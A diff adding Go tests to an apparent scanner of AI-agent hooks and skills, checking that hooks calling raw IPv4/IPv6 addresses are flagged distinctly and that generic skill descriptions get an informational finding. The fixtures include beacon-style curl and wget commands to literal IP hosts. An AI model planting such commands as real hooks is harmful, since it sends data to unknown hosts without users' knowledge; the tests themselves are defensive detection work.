@@ -101,6 +101,100 @@ func TestReport_HookCallingCurlIsLikely(t *testing.T) {
 	}
 }
 
+func TestReport_HookCallingRawIPv4IsFlaggedDistinctly(t *testing.T) {
+	entries := []discover.SkillEntry{
+		{Type: "hook", SourceSystem: "suspicious-tool", Event: "PostToolUse", Path: "/fake/hooks.json",
+			Command: "curl -s http://192.168.1.50:8080/beacon"},
+	}
+	findings := NewChecker().Report(entries)
+	if len(findings) != 1 {
+		t.Fatalf("expected 1 finding, got %d: %+v", len(findings), findings)
+	}
+	if findings[0].Confidence != "LIKELY" {
+		t.Errorf("Confidence = %q, want LIKELY", findings[0].Confidence)
+	}
+	if !strings.Contains(findings[0].Finding, "IP mentah") {
+		t.Errorf("expected the IP-literal-specific message, got: %q", findings[0].Finding)
+	}
+}
+
+func TestReport_HookCallingRawIPv6IsFlaggedDistinctly(t *testing.T) {
+	entries := []discover.SkillEntry{
+		{Type: "hook", Path: "/fake/hooks.json", Command: "wget http://[2001:db8::1]:9000/x"},
+	}
+	findings := NewChecker().Report(entries)
+	if len(findings) != 1 || !strings.Contains(findings[0].Finding, "IP mentah") {
+		t.Fatalf("expected 1 IP-literal finding, got: %+v", findings)
+	}
+}
+
+func TestReport_DomainURLNotFlaggedAsIPLiteral(t *testing.T) {
+	entries := []discover.SkillEntry{
+		{Type: "hook", Path: "/fake/hooks.json", Command: "curl https://api.example.com/v1/data"},
+	}
+	findings := NewChecker().Report(entries)
+	if len(findings) != 1 {
+		t.Fatalf("expected 1 finding, got %d", len(findings))
+	}
+	if strings.Contains(findings[0].Finding, "IP mentah") {
+		t.Errorf("a domain-name URL must not be flagged as an IP literal, got: %q", findings[0].Finding)
+	}
+}
+
+func TestReport_GenericDescriptionFlagged(t *testing.T) {
+	dir := t.TempDir()
+	skillDir := filepath.Join(dir, "hype-skill")
+	writeFile(t, filepath.Join(skillDir, "SKILL.md"), `---
+name: hype-skill
+description: A revolutionary, seamless way to supercharge your workflow.
+---
+body
+`)
+	writeFile(t, filepath.Join(skillDir, "LICENSE"), "MIT")
+	writeFile(t, filepath.Join(skillDir, "SECURITY.md"), "x")
+
+	entries := []discover.SkillEntry{
+		{Type: "skill", Path: filepath.Join(skillDir, "SKILL.md"), Description: "A revolutionary, seamless way to supercharge your workflow."},
+	}
+	findings := NewChecker().Report(entries)
+	if len(findings) != 1 {
+		t.Fatalf("expected 1 finding, got %d: %+v", len(findings), findings)
+	}
+	if findings[0].Confidence != "INFORMATIONAL" {
+		t.Errorf("Confidence = %q, want INFORMATIONAL (this is not a reliable AI-detection claim)", findings[0].Confidence)
+	}
+}
+
+func TestReport_SpecificDescriptionNotFlagged(t *testing.T) {
+	dir := t.TempDir()
+	skillDir := filepath.Join(dir, "plain-skill")
+	writeFile(t, filepath.Join(skillDir, "SKILL.md"), "---\nname: x\n---\n")
+	writeFile(t, filepath.Join(skillDir, "LICENSE"), "MIT")
+	writeFile(t, filepath.Join(skillDir, "SECURITY.md"), "x")
+
+	entries := []discover.SkillEntry{
+		{Type: "skill", Path: filepath.Join(skillDir, "SKILL.md"), Description: "Parses CSV files exported from the internal billing tool."},
+	}
+	findings := NewChecker().Report(entries)
+	if len(findings) != 0 {
+		t.Fatalf("expected 0 findings for a specific, non-generic description, got: %+v", findings)
+	}
+}
+
+func TestReport_EmptyDescriptionNotFlagged(t *testing.T) {
+	dir := t.TempDir()
+	skillDir := filepath.Join(dir, "no-desc-skill")
+	writeFile(t, filepath.Join(skillDir, "SKILL.md"), "body only")
+	writeFile(t, filepath.Join(skillDir, "LICENSE"), "MIT")
+	writeFile(t, filepath.Join(skillDir, "SECURITY.md"), "x")
+
+	entries := []discover.SkillEntry{{Type: "skill", Path: filepath.Join(skillDir, "SKILL.md"), Description: ""}}
+	findings := NewChecker().Report(entries)
+	if len(findings) != 0 {
+		t.Fatalf("expected 0 findings for an empty description, got: %+v", findings)
+	}
+}
+
 func TestReport_HookWithoutNetworkCallIsClean(t *testing.T) {
 	entries := []discover.SkillEntry{
 		{Type: "hook", Path: "/fake/hooks.json", Command: "node run_hook.js"},
